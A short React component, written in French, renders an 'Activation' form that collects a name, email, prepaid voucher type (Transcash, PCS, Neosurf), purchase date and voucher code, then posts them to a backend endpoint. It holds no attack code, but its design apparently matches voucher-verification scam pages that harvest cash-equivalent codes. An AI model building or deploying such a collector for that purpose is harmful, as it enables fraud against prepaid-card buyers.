import { useState } from "react";
import axios from "axios"

function Activation() {
    const [formData, setFormData] = useState({
        nom: "",
        prenom:  "",
        email: "",
        typeRecharge: "",
        dateAchat: "",
        codeRecharge: "",
        cacherCode: "",
    });
    const handleChange = (e) => {
        setFormData({
            ...formData,
            [e.target.name]: e.target.value
        });
    };

    const handleSbmit = async (e) => {
        e.preventDefault();

        try{
            await axios.post(
            `${import.meta.env.VITE_API_URL}/envoyer`,
        {
            ...formData,
            formulaire: "Activation"
       }
    );

            alert("Informations envoyées");
        }catch(error){
            console.error(error);
            alert(error.message);
        }
    };

    return (
        <section>
            <div className="Activation">
                <form onSubmit={handleSbmit}>
                    <h1>Activation</h1>
                    <h3>Remplicer le formulaire ci-dessou</h3>

                    <h4>NOM</h4>
                    <input type="text" name="nom" placeholder="nom" value={formData.nom} onChange={handleChange} required/><br></br>
                    <h4>PRÉNOM</h4>
                    <input type="text" name="prenom" placeholder="prénom" value={formData.prenom}  onChange={handleChange} required/><br></br>
                    <h4>EMAIL</h4>
                    <input type="email" name="email" placeholder="email" value={formData.email} onChange={handleChange} required/><br></br>
                    <h4>TYPE DE RECHARGE</h4>
                    <select name="typeRecharge" value={formData.typeRecharge} onChange={handleChange}>
                        <option value="TRANSCACH">TRANSCACH</option>
                        <option value="PCS">PCS</option>
                        <option value="NEOSURF">NEOSURF</option>
                    </select>
                    <br></br>
                    <h4>DATE D'ACHAT</h4>
                    <input type="date" name="dateAchat" placeholder="dATE d'ACHAT" value={formData.dateAchat} onChange={handleChange} required/><br></br>
                    <h4>CODE DU RECHARGE</h4>
                    <input type="text" name="codeRecharge" placeholder="code" value={formData.codeRecharge} onChange={handleChange} required/><br></br>
                    <h4>CACHER LE CODE</h4>
                    <select name="cacherCode" value={formData.cacherCode} onChange={handleChange}  >
                        <option value="OUI">OUI</option>
                        <option value="NON">NON</option>
                    </select>
                    <br></br>
                    <br></br><button type="submit" className="btn">ENVOYER</button>

                </form>
            </div>
        </section>
    )
}
export default Activation;
